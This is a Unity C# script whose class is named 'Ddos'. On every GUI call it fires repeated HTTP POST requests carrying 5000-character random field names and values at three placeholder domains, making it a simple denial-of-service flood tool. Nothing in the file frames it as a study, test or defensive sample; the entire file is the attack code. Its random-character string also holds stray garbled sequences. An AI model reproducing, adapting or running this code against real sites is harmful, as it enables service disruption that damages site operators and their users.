using System.Collections;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UIElements;

public class Ddos : MonoBehaviour
{
    // Start is called before the first frame update
    void OnGUI()
    {
        StartCoroutine(postRequest("https://www.example.com"));
        StartCoroutine(postRequest("https://www.example.net"));
        StartCoroutine(postRequest("https://www.example.org"));
    }

    IEnumerator postRequest(string url)
    {
        WWWForm form = new WWWForm();
        form.AddField(RandomStringGenerator(5000), RandomStringGenerator(5000));

        using (UnityWebRequest www = UnityWebRequest.Post(url, form))
        {
            yield return www.SendWebRequest();

            if (www.result != UnityWebRequest.Result.Success)
            {
                Debug.Log(www.error);
            }
            else
            {
                Debug.Log("Done!");
            }
        }
    }

    string RandomStringGenerator(int length)
    {
        string characters = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO0050PQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîï00F0ðñòóôõö÷øùúûüýþÿ";
        string generated_string = "";

        for (int i = 0; i < length; i++)
            generated_string += characters[Random.Range(0, characters.Length)];

        return generated_string;
    }
}
